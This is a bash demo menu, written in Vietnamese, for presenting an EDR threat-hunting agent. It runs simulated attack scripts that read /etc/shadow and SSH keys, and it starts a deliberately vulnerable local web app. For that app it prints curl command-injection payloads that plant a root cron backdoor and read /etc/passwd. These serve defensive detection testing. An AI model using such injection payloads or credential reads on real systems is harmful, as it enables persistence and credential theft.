#!/bin/bash
# EDR Threat Hunting Agent - Unified Demo Control Panel
# Helps present Giai doan 1 feasibility and testing scenarios to the board.

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

clear
echo -e "${BLUE}================================================================${NC}"
echo -e "${BLUE}    EDR AGENT THREAT HUNTING ENGINE - DEMO CONTROL PANEL       ${NC}"
echo -e "${BLUE}================================================================${NC}"
echo -e "Chào anh! Đây là bảng điều khiển hỗ trợ demo Đề tài Giai đoạn 1."
echo -e "Vui lòng chọn kịch bản anh muốn trình diễn:"
echo ""
echo -e "  ${CYAN}[1]${NC} Chạy giả lập cuộc tấn công chuỗi APT (ML ONNX + Threat Score)"
echo -e "      ${GRAY}* Chứng minh: Rarity (1.00), Sequence (1.00), ML Score (0.79) -> CRITICAL (0.94)${NC}"
echo ""
echo -e "  ${CYAN}[2]${NC} Chạy kịch bản Hacker đánh cắp mật khẩu (Credential Access)"
echo -e "      ${GRAY}* Thực tế đọc file /etc/shadow và SSH keys để kích hoạt File Monitor${NC}"
echo ""
echo -e "  ${CYAN}[3]${NC} Chạy kịch bản Hacker ẩn dật, xóa dấu tiến trình (Reparenting/PPID)"
echo -e "      ${GRAY}* Chứng minh: Mồ côi hóa tiến trình nhưng EDR vẫn giữ được phả hệ cha thật${NC}"
echo ""
echo -e "  ${CYAN}[4]${NC} Khởi chạy ứng dụng Web lỗi (Command Injection) để tự tay khai thác"
echo -e "      ${GRAY}* Chạy ứng dụng web Python và hướng dẫn các lệnh curl để hack thực tế${NC}"
echo ""
echo -e "  ${CYAN}[5]${NC} Thoát bảng điều khiển"
echo -e "${BLUE}================================================================${NC}"
echo -n "Lựa chọn của anh (1-5): "
read choice

case $choice in
    1)
        clear
        echo -e "${GREEN}[INFO] Khởi chạy EDR Agent với chế độ SIMULATOR cuộc tấn công APT...${NC}"
        echo -e "${YELLOW}[NOTE] Hãy quan sát bảng vẽ khối THREAT DETECTED đỏ rực rỡ xuất hiện ở cuối.${NC}"
        echo ""
        sleep 2
        sudo EDR_SIMULATE_ATTACK=true ./bin/edr-agent --config agent/config.yaml
        ;;
    2)
        clear
        echo -e "${GREEN}[INFO] Khởi động EDR Agent ngầm dưới nền...${NC}"
        sudo ./bin/edr-agent --config agent/config.yaml > /tmp/edr-agent-demo.log 2>&1 &
        AGENT_PID=$!
        sleep 2
        
        echo -e "${GREEN}[INFO] Tiến hành chạy script tấn công Credential Access...${NC}"
        echo ""
        sudo ./demo/attack_scripts/02_credential_access.sh
        
        echo ""
        echo -e "${YELLOW}[NOTE] Dưới đây là log thực tế EDR Agent ghi nhận khi script đọc /etc/shadow:${NC}"
        echo ""
        sleep 1
        grep -E "Sensitive file modified|Persistence mechanism changed" /tmp/edr-agent-demo.log | tail -n 10
        
        # Cleanup
        sudo kill $AGENT_PID > /dev/null 2>&1
        rm -f /tmp/edr-agent-demo.log
        ;;
    3)
        clear
        echo -e "${GREEN}[INFO] Khởi động EDR Agent ngầm dưới nền...${NC}"
        sudo ./bin/edr-agent --config agent/config.yaml > /tmp/edr-agent-demo.log 2>&1 &
        AGENT_PID=$!
        sleep 2
        
        echo -e "${GREEN}[INFO] Tiến hành chạy script test mất dấu cha Reparenting...${NC}"
        echo ""
        ./demo/attack_scripts/04_reparenting_test.sh
        
        # Cleanup
        sudo kill $AGENT_PID > /dev/null 2>&1
        rm -f /tmp/edr-agent-demo.log
        ;;
    4)
        clear
        echo -e "${GREEN}[INFO] Khởi chạy ứng dụng Web lỗi (Command Injection) tại http://127.0.0.1:5000...${NC}"
        # Kill if already running
        pkill -f vuln_app.py > /dev/null 2>&1
        python3 /tmp/vuln_app.py > /tmp/vuln_app_demo.log 2>&1 &
        PY_PID=$!
        sleep 1
        
        echo -e "${YELLOW}Ứng dụng đã chạy dưới nền (PID: $PY_PID).${NC}"
        echo -e "Anh hãy mở Terminal khác và dùng lệnh ${CYAN}curl${NC} dưới đây để giả lập hack:"
        echo ""
        echo -e "  ${CYAN}Lệnh test 1 (Ghi file cron backdoor):${NC}"
        echo -e "  curl \"http://127.0.0.1:5000/ping?ip=127.0.0.1;echo+'*+*+*+*+*+root+/tmp/evil.sh'+>+/etc/cron.d/backdoor\""
        echo ""
        echo -e "  ${CYAN}Lệnh test 2 (Đọc pass shadow):${NC}"
        echo -e "  curl \"http://127.0.0.1:5000/ping?ip=127.0.0.1;cat+/etc/passwd\""
        echo ""
        echo -e "Nhấn ${RED}[Enter]${NC} để dừng ứng dụng web và quay lại menu chính..."
        read
        kill $PY_PID > /dev/null 2>&1
        rm -f /tmp/vuln_app_demo.log
        ;;
    5)
        echo "Tạm biệt anh!"
        exit 0
        ;;
    *)
        echo "Lựa chọn không hợp lệ!"
        sleep 1
        ;;
esac
